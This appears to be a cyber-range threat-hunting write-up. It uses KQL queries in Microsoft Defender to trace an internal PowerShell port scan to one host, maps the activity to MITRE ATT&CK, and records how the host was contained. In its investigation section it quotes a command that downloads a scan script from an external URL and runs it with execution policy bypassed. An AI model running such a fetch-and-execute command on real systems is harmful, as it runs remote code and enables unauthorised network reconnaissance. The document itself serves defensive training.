

# Sudden Network Slowdowns Project 
# Objective:
To investigate abnormal traffic patterns originating from within the network, identify any signs of lateral movement or misuse of built-in tools (e.g., PowerShell), and validate whether an internal host is responsible for the performance degradation.

---
# Tools & Technology:
- Azure Virtual Machine
- PowerShell 
- Microsoft Defender
- KQL Query

---
# Table of contents

- [1. Summary](#1-summary)
- [2. Preparation](#2-preparation)
- [3. Data Collection](#3-data-collection)
- [4. Data Analysis](#4-data-analysis)
- [5. Investigation](#5-investigation)
- [6. Response](#6-response)
- [7. MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
- [8. Lessons Learned / Improvement:](#8-lessons-learned--improvement)
- [9. Final Status](#9-final-status)
---


## 🛡️ Incident Report: Internal Port Scanning Activity on 10.0.0.0/16 Network
## 1. Summary
Incident Title: Unauthorized Internal Port Scanning via PowerShell <br />
Date of Discovery: June 10, 2025 <br />
Reporting Team: Security Operations / Threat Hunting <br />
Impacted Network Segment: 10.0.0.0/16 <br />
Affected Host: windows-target-1 (10.0.0.5) <br />
TTPs Observed: T1046, T1059.001, T1078, T1105, T1204.002 <br />
Incident Status: Contained; Rebuilt/ Re-imaging  <br />

## 2. Preparation
### Observation:
The server team reported network performance degradation affecting older devices on the 10.0.0.0/16 internal network.

### Initial Assumption:
After ruling out external threats (e.g., DDoS), internal causes such as large file transfers or port scanning were considered. The environment allows unrestricted internal traffic and the use of scripting tools like PowerShell.

### Hypothesis:
A compromised internal host may be engaging in lateral movement or reconnaissance via port scanning.

## 3. Data Collection
### Data Sources Queried:
#### DeviceNetworkEvents
  ![DataCollection1](https://github.com/user-attachments/assets/74d73fd3-8472-4d27-a1cc-59aafc29736d)

#### DeviceProcessEvents
  ![DataCollection2](https://github.com/user-attachments/assets/b8cacdcc-dac6-4469-856d-d19205730b9e)

#### DeviceFileEvents 
![DataCollection3](https://github.com/user-attachments/assets/f53e8661-60e6-45a2-97f1-409192e3a672)



## 4. Data Analysis

### Focus Areas:

- Failed network connections (potential scanning) 
- Suspicious process executions
- File downloads or script execution activity
  
### Step 1:
Analyzed DeviceNetworkEvents for failed outbound connection attempts.

```kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize ConnectionCount = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by ConnectionCount

```

![DataCollection4](https://github.com/user-attachments/assets/d067d36d-1ea9-4c6f-8933-97b668d4e367)


Result: IP 10.0.0.5 exhibited an unusually high number of failed connections.

### Step 2:
Filtered for all failed connection timestamps for IP 10.0.0.5:

```kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
```
![DataCollection5](https://github.com/user-attachments/assets/55159acf-f97d-47e9-b5f4-d60283a8ec1c)



Finding:
Connections were attempted to multiple ports in sequential order—indicating an automated port scan.

## 5. Investigation

Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:

```kql
let VMName = "windows-target-1";
let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "portscan"
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName

```
![DeviceProcessEvents](https://github.com/user-attachments/assets/42402a97-5812-4ae5-9230-e88689618cbc)

Account:
Executed by SYSTEM — not expected behavior; not triggered by any admin.

Key Finding:
A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1

```

I logged into the suspect computer and observed the powershell script that was used to conduct the port scan:

![portscan](https://github.com/user-attachments/assets/ba71f03c-5e53-4fab-bf31-743708f8d6d2)


## 6. Response
### Actions Taken:

- Logged into the device to verify script existence. 
- Confirmed the file portscan.ps1 existed under C:\ProgramData. 
- Isolated the host from the network. 
- Performed a full malware scan (no malware detected). 
- Escalated to IT for reimaging of the device to ensure integrity. 

## 7. MITRE ATT&CK Mapping

- T1046 - Network Service Discovery  
  (Port scanning activity to identify open services)

- T1059.001 - Command and Scripting Interpreter: PowerShell  
  (Execution of PowerShell script to perform scan)

- T1078 - Valid Accounts  
  (Script executed under SYSTEM account)

- T1105 - Ingress Tool Transfer  
  (Script downloaded from external URL using Invoke-WebRequest)

- T1204.002 - User Execution: Malicious File  
  (Execution of suspicious PowerShell file)

- T1562.001 - Impair Defenses (if applicable)  
  (Not confirmed, but would apply if local defenses were bypassed or modified)

## 8. Lessons Learned / Improvement: 

Review PowerShell execution policies and endpoint monitoring rules

## 9. Final Status

Threat Contained: ✅

Device Isolated: ✅

Malware Scan Result: Clean

Device Action: Ticket submitted for full rebuild




